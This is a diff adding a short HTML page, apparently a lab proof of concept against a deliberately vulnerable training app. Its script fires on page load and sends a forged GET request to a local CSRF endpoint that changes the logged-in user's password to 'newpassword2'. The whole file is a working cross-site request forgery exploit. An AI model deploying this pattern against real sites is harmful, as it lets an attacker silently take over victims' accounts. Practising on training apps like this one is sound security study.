@@ -1,0 +1,18 @@
+<html>
+    <head>
+
+    </head>
+    <body onload="change_password()">
+        <script>
+            function change_password(){
+            const request = new XMLHttpRequest();
+            const url = 'http://localhost/vulnerabilities/csrf/?password_new=newpassword2&password_conf=newpassword2&Change=Change#'
+            
+            request.open("GET", url);
+     
+            request.send();
+            }
+
+        </script>
+    </body>
+</html>
